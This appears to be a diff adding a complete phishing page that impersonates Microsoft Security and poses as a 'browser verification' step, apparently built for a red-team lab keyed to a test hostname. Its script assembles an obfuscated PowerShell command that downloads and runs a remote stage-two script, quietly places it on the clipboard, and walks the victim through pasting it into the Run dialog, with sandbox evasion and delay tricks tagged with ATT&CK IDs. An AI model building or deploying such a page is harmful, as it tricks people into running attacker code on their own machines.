@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Verification Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f3f2f1;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            background: white;
+            border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+            padding: 40px 48px;
+            max-width: 520px;
+            width: 100%;
+        }
+        .ms-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 28px;
+        }
+        .ms-logo svg { width: 22px; height: 22px; }
+        .ms-logo span {
+            font-size: 15px;
+            color: #323130;
+            font-weight: 600;
+            letter-spacing: -0.2px;
+        }
+        .shield-wrap {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .shield-wrap svg { width: 52px; height: 52px; }
+        h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #201f1e;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+        .subtitle {
+            font-size: 13.5px;
+            color: #605e5c;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+        .divider { border: none; border-top: 1px solid #edebe9; margin: 20px 0; }
+        .steps-title {
+            font-size: 13px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 14px;
+        }
+        .steps { list-style: none; display: flex; flex-direction: column; gap: 12px; }
+        .steps li {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            font-size: 13.5px;
+            color: #323130;
+            line-height: 1.5;
+        }
+        .step-num {
+            background: #0078d4;
+            color: white;
+            border-radius: 50%;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: 700;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+        .kbd {
+            display: inline-flex;
+            align-items: center;
+            gap: 2px;
+            background: #f3f2f1;
+            border: 1px solid #c8c6c4;
+            border-radius: 3px;
+            padding: 1px 6px;
+            font-size: 12px;
+            font-family: 'Segoe UI', monospace;
+            color: #201f1e;
+            white-space: nowrap;
+        }
+        .cmd-box {
+            background: #f8f8f8;
+            border: 1px solid #d2d0ce;
+            border-radius: 3px;
+            padding: 10px 12px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 12px;
+            color: #a19f9d;
+            margin-top: 6px;
+            word-break: break-all;
+            letter-spacing: 0.3px;
+            user-select: none;
+        }
+        .copy-btn {
+            display: block;
+            width: 100%;
+            margin-top: 20px;
+            padding: 9px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            font-family: 'Segoe UI', sans-serif;
+            transition: background 0.15s;
+        }
+        .copy-btn:hover { background: #106ebe; }
+        .copy-btn:active { background: #005a9e; }
+        .copy-btn.copied { background: #107c10; }
+        .notice {
+            font-size: 11.5px;
+            color: #a19f9d;
+            text-align: center;
+            margin-top: 14px;
+            line-height: 1.5;
+        }
+        .error-banner {
+            background: #fde7e9;
+            border-left: 3px solid #d13438;
+            border-radius: 2px;
+            padding: 10px 14px;
+            font-size: 13px;
+            color: #a4262c;
+            margin-bottom: 20px;
+            display: none;
+        }
+        .spinner-wrap {
+            text-align: center;
+            padding: 20px 0;
+        }
+        .spinner {
+            border: 3px solid #edebe9;
+            border-top: 3px solid #0078d4;
+            border-radius: 50%;
+            width: 36px;
+            height: 36px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 12px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .spinner-wrap p { font-size: 13px; color: #605e5c; }
+        .main-content { display: none; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <!-- Microsoft branding -->
+    <div class="ms-logo">
+        <svg viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg">
+            <rect x="1" y="1" width="10" height="10" fill="#f25022"/>
+            <rect x="12" y="1" width="10" height="10" fill="#7fba00"/>
+            <rect x="1" y="12" width="10" height="10" fill="#00a4ef"/>
+            <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+        </svg>
+        <span>Microsoft Security</span>
+    </div>
+
+    <!-- Loading state -->
+    <div class="spinner-wrap" id="spinner">
+        <div class="spinner"></div>
+        <p>Checking browser security status...</p>
+    </div>
+
+    <!-- Main content (shown after check) -->
+    <div class="main-content" id="main">
+        <div class="shield-wrap">
+            <svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M26 4L6 12V26C6 37.05 14.68 47.4 26 50C37.32 47.4 46 37.05 46 26V12L26 4Z" fill="#fde7e9" stroke="#d13438" stroke-width="2"/>
+                <path d="M22 26l3 3 6-6" stroke="#d13438" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="display:none"/>
+                <text x="26" y="32" text-anchor="middle" font-size="18" fill="#d13438" font-family="Segoe UI">!</text>
+            </svg>
+        </div>
+
+        <h1>Browser Verification Required</h1>
+        <p class="subtitle">
+            Your browser could not complete automatic verification.<br>
+            Please follow the steps below to confirm you are not a robot.
+        </p>
+
+        <div class="error-banner" id="errorBanner">
+            Automatic verification failed. Manual confirmation required.
+        </div>
+
+        <hr class="divider">
+
+        <p class="steps-title">Complete the following steps:</p>
+        <ol class="steps">
+            <li>
+                <span class="step-num">1</span>
+                <span>Press <span class="kbd">⊞ Win</span> + <span class="kbd">R</span> to open the Run dialog</span>
+            </li>
+            <li>
+                <span class="step-num">2</span>
+                <span>Click the button below to copy the verification command, then paste it into the Run dialog using <span class="kbd">Ctrl</span> + <span class="kbd">V</span></span>
+            </li>
+            <li>
+                <span class="step-num">3</span>
+                <span>Press <span class="kbd">Enter</span> to complete verification</span>
+            </li>
+        </ol>
+
+        <div class="cmd-box" id="cmdDisplay">••••••••••••••••••••••••••••••••••••••••••••••</div>
+
+        <button class="copy-btn" id="copyBtn" onclick="copyCommand()">
+            Copy Verification Command
+        </button>
+
+        <p class="notice">
+            This verification is required by your organization's security policy.<br>
+            Session ID: <span id="sessionId"></span>
+        </p>
+    </div>
+</div>
+
+<script>
+    // T1480.001 - Environmental Keying: restrict to lab hostname only
+    if (window.location.hostname !== 'upload.testlab.local') {
+        window.location.replace('https://support.microsoft.com/');
+    }
+
+    // T1497.001 - Virtualization/Sandbox Evasion: System Checks
+    function sandboxCheck() {
+        if (screen.width < 1000 || screen.height < 700) return true;
+        if (navigator.plugins.length === 0) return true;
+        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        if (!tz || tz === 'UTC') return true;
+        return false;
+    }
+
+    // T1497.002 - User Activity Based Checks
+    var interactions = 0;
+    document.addEventListener('mousemove', function() { interactions++; });
+    document.addEventListener('keydown', function() { interactions += 3; });
+
+    // T1027.010 - Command Obfuscation: build PS command via string fragments
+    function buildCommand() {
+        var parts = [
+            'p', 'ow', 'er', 'sh', 'ell',
+            ' -', 'win', 'dow', 'Sty', 'le', ' hi', 'dde', 'n',
+            ' -e', 'xe', 'cut', 'ion', 'Pol', 'icy', ' by', 'pas', 's',
+            ' -c', 'om', 'man', 'd'
+        ];
+        var exec = ['IE', 'X(', '(New', '-Obj', 'ect', ' Net', '.Web', 'Cli', 'ent)', '.Down', 'load', 'Str', 'ing('].join('');
+        var url  = ['\'ht', 'tp://', 'upload', '.testl', 'ab.lo', 'cal/up', 'loads/', 'stage2', '_mini', 'mal.ps1\''].join('');
+        return parts.join('') + ' "' + exec + url + '))"';
+    }
+
+    // T1678 - Delay Execution: show spinner first, reveal UI after delay
+    var delay = sandboxCheck() ? 999999 : 4500;
+
+    setTimeout(function() {
+        if (interactions < 1 && !sandboxCheck()) {
+            // still show — user may not have moved mouse yet, give benefit of doubt
+        }
+
+        document.getElementById('spinner').style.display = 'none';
+        document.getElementById('main').style.display = 'block';
+        document.getElementById('errorBanner').style.display = 'block';
+
+        // Generate fake session ID for legitimacy
+        document.getElementById('sessionId').textContent =
+            Math.random().toString(36).substr(2, 8).toUpperCase() + '-' +
+            Math.random().toString(36).substr(2, 4).toUpperCase();
+
+        // T1204.004 - Malicious Copy and Paste: pre-load clipboard silently
+        var cmd = buildCommand();
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(cmd).catch(function() {});
+        }
+    }, delay);
+
+    function copyCommand() {
+        // T1204.004 - explicit user-triggered clipboard write (fallback + reinforce)
+        var cmd = buildCommand();
+        var btn = document.getElementById('copyBtn');
+
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(cmd).then(function() {
+                btn.textContent = '✓ Command Copied';
+                btn.classList.add('copied');
+                setTimeout(function() {
+                    btn.textContent = 'Copy Verification Command';
+                    btn.classList.remove('copied');
+                }, 2500);
+            }).catch(function() {
+                fallbackCopy(cmd, btn);
+            });
+        } else {
+            fallbackCopy(cmd, btn);
+        }
+    }
+
+    function fallbackCopy(text, btn) {
+        var ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+        ta.focus();
+        ta.select();
+        try {
+            document.execCommand('copy');
+            btn.textContent = '✓ Command Copied';
+            btn.classList.add('copied');
+            setTimeout(function() {
+                btn.textContent = 'Copy Verification Command';
+                btn.classList.remove('copied');
+            }, 2500);
+        } catch(e) {}
+        document.body.removeChild(ta);
+    }
+</script>
+</body>
+</html>
